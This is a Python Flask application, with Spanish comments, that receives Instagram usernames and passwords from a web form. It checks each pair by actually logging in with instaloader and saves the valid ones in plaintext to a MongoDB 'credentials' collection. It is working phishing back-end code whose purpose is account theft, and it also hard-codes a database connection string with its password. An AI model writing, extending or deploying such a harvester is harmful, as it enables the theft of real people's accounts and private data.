from flask import Flask, request, render_template, jsonify
import instaloader
import pymongo
from pymongo import MongoClient

app = Flask(__name__)

# Conexión con la base de datos MongoDB
client = MongoClient("mongodb+srv://jhonmerk:JonDeere123!?@cluster0.kpdju.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0")
db = client.mydatabase
collection = db.credentials  # Colección donde se almacenarán las credenciales

# Función para comprobar las credenciales de Instagram
def check_instagram_credentials(email, password):
    loader = instaloader.Instaloader()
    try:
        loader.login(email, password)  # Intentar iniciar sesión
        return True
    except instaloader.exceptions.BadCredentialsException:
        return False
    except Exception as e:
        return False

# Ruta para la página principal
@app.route('/')
def index():
    return render_template('index.html')

# Ruta para el procesamiento del formulario
@app.route('/submit', methods=['POST'])
def submit():
    username = request.form['username']
    password = request.form['password']

    # Validar las credenciales con Instaloader
    if check_instagram_credentials(username, password):
        # Si las credenciales son válidas, guardarlas en la base de datos
        collection.insert_one({"username": username, "password": password})
        return jsonify({"message": "Credenciales válidas y almacenadas en la base de datos."})
    else:
        return jsonify({"error": "Credenciales incorrectas"}), 400

#if __name__ == '__main__':
 #   app.run(port=5001)
if __name__ == '__main__':
    app.run(debug=True)
